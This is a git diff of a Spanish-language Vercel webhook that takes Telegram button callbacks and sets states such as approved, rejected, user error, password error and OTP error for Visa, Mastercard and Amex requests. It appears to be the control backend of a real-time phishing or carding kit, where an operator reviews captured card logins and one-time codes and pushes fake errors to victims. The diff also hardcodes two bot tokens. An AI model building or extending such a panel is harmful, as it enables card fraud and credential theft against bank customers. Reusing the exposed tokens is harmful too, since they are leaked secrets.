@@ -1,7 +1,7 @@
 // api/webhook.js - WEBHOOK COMPLETO PARA VERCEL
-// ACTUALIZADO con nuevo bot: 8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM
+// ACTUALIZADO con nuevo bot: 8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ
 
-const TELEGRAM_BOT_TOKEN = '8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM';
+const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // Almacenamiento temporal en memoria (para Vercel)
@@ -98,7 +98,7 @@ export default async function handler(req, res) {
                 }
 
                 // ============================================
-                // PAGO CON TARJETA - APROBAR (Visa, Master, Amex)
+                // PAGO CON TARJETA - VISA
                 // ============================================
                 else if (callbackData.startsWith('approve_visa_')) {
                     action = 'approved';
@@ -106,33 +106,37 @@ export default async function handler(req, res) {
                     respuestaTexto = '✅ Pago aprobado (Visa)';
                     estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Visa';
                 }
-                else if (callbackData.startsWith('approve_master_')) {
-                    action = 'approved';
-                    solicitudId = callbackData.replace('approve_master_', '');
-                    respuestaTexto = '✅ Pago aprobado (Mastercard)';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Mastercard';
-                }
-                else if (callbackData.startsWith('approve_amex_')) {
-                    action = 'approved';
-                    solicitudId = callbackData.replace('approve_amex_', '');
-                    respuestaTexto = '✅ Pago aprobado (Amex)';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Amex';
-                }
-
-                // ============================================
-                // PAGO CON TARJETA - RECHAZAR (Visa, Master, Amex)
-                // ============================================
                 else if (callbackData.startsWith('reject_visa_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_visa_', '');
                     respuestaTexto = '❌ Pago rechazado (Visa)';
                     estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                 }
+
+                // ============================================
+                // PAGO CON TARJETA - MASTERCARD
+                // ============================================
+                else if (callbackData.startsWith('approve_master_')) {
+                    action = 'approved';
+                    solicitudId = callbackData.replace('approve_master_', '');
+                    respuestaTexto = '✅ Pago aprobado (Mastercard)';
+                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Mastercard';
+                }
                 else if (callbackData.startsWith('reject_master_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_master_', '');
                     respuestaTexto = '❌ Pago rechazado (Mastercard)';
                     estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
+                }
+
+                // ============================================
+                // PAGO CON TARJETA - AMEX
+                // ============================================
+                else if (callbackData.startsWith('approve_amex_')) {
+                    action = 'approved';
+                    solicitudId = callbackData.replace('approve_amex_', '');
+                    respuestaTexto = '✅ Pago aprobado (Amex)';
+                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Amex';
                 }
                 else if (callbackData.startsWith('reject_amex_')) {
                     action = 'rejected';
@@ -142,23 +146,11 @@ export default async function handler(req, res) {
                 }
 
                 // ============================================
-                // ERRORES DE CREDENCIALES (con tipo de tarjeta)
+                // ERRORES DE CREDENCIALES VISA
                 // ============================================
                 else if (callbackData.startsWith('error_user_visa_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('error_user_visa_', '');
-                    respuestaTexto = '❌ Error de usuario';
-                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
-                }
-                else if (callbackData.startsWith('error_user_master_')) {
-                    action = 'error_user';
-                    solicitudId = callbackData.replace('error_user_master_', '');
-                    respuestaTexto = '❌ Error de usuario';
-                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
-                }
-                else if (callbackData.startsWith('error_user_amex_')) {
-                    action = 'error_user';
-                    solicitudId = callbackData.replace('error_user_amex_', '');
                     respuestaTexto = '❌ Error de usuario';
                     estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                 }
@@ -168,29 +160,49 @@ export default async function handler(req, res) {
                     respuestaTexto = '❌ Error de contraseña';
                     estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                 }
-                else if (callbackData.startsWith('error_pass_master_')) {
-                    action = 'error_pass';
-                    solicitudId = callbackData.replace('error_pass_master_', '');
-                    respuestaTexto = '❌ Error de contraseña';
-                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
-                }
-                else if (callbackData.startsWith('error_pass_amex_')) {
-                    action = 'error_pass';
-                    solicitudId = callbackData.replace('error_pass_amex_', '');
-                    respuestaTexto = '❌ Error de contraseña';
-                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
-                }
                 else if (callbackData.startsWith('error_otp_visa_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('error_otp_visa_', '');
                     respuestaTexto = '❌ Error de OTP';
                     estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                 }
+
+                // ============================================
+                // ERRORES DE CREDENCIALES MASTERCARD
+                // ============================================
+                else if (callbackData.startsWith('error_user_master_')) {
+                    action = 'error_user';
+                    solicitudId = callbackData.replace('error_user_master_', '');
+                    respuestaTexto = '❌ Error de usuario';
+                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
+                }
+                else if (callbackData.startsWith('error_pass_master_')) {
+                    action = 'error_pass';
+                    solicitudId = callbackData.replace('error_pass_master_', '');
+                    respuestaTexto = '❌ Error de contraseña';
+                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
+                }
                 else if (callbackData.startsWith('error_otp_master_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('error_otp_master_', '');
                     respuestaTexto = '❌ Error de OTP';
                     estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
+                }
+
+                // ============================================
+                // ERRORES DE CREDENCIALES AMEX
+                // ============================================
+                else if (callbackData.startsWith('error_user_amex_')) {
+                    action = 'error_user';
+                    solicitudId = callbackData.replace('error_user_amex_', '');
+                    respuestaTexto = '❌ Error de usuario';
+                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
+                }
+                else if (callbackData.startsWith('error_pass_amex_')) {
+                    action = 'error_pass';
+                    solicitudId = callbackData.replace('error_pass_amex_', '');
+                    respuestaTexto = '❌ Error de contraseña';
+                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                 }
                 else if (callbackData.startsWith('error_otp_amex_')) {
                     action = 'error_otp';
@@ -200,7 +212,7 @@ export default async function handler(req, res) {
                 }
 
                 // ============================================
-                // FORMATOS SIMPLES (sin tipo de tarjeta)
+                // FORMATOS GENÉRICOS (fallback)
                 // ============================================
                 else if (callbackData.startsWith('approve_')) {
                     action = 'approved';
@@ -232,16 +244,13 @@ export default async function handler(req, res) {
                     respuestaTexto = '❌ Error de OTP';
                     estadoMensaje = '❌ *ERROR OTP*';
                 }
-
-                // ============================================
-                // FALLBACK
-                // ============================================
                 else {
+                    // Fallback para cualquier otro callback
                     const parts = callbackData.split('_');
                     action = parts[0] || 'unknown';
                     solicitudId = parts.slice(1).join('_') || 'unknown';
                     respuestaTexto = 'Procesado';
-                    estadoMensaje = 'Procesado';
+                    estadoMensaje = '⚠️ Acción desconocida';
                     console.log('⚠️ Callback no reconocido:', callbackData);
                 }
 
@@ -304,7 +313,8 @@ export default async function handler(req, res) {
                 });
             }
 
-            return res.status(200).json({ success: true });
+            // Si no es callback_query, solo confirmar recepción
+            return res.status(200).json({ success: true, message: 'Update recibido' });
 
         } catch (error) {
             console.error('❌ Error procesando webhook:', error);
@@ -359,7 +369,8 @@ export default async function handler(req, res) {
                     success: true,
                     solicitudId: check,
                     estado: solicitud.estado,
-                    timestamp: solicitud.timestamp
+                    timestamp: solicitud.timestamp,
+                    tipo: solicitud.tipo || 'unknown'
                 });
             } else {
                 return res.status(200).json({
@@ -382,4 +393,4 @@ export default async function handler(req, res) {
     }
 
     return res.status(405).json({ error: 'Método no permitido' });
-        }
+}
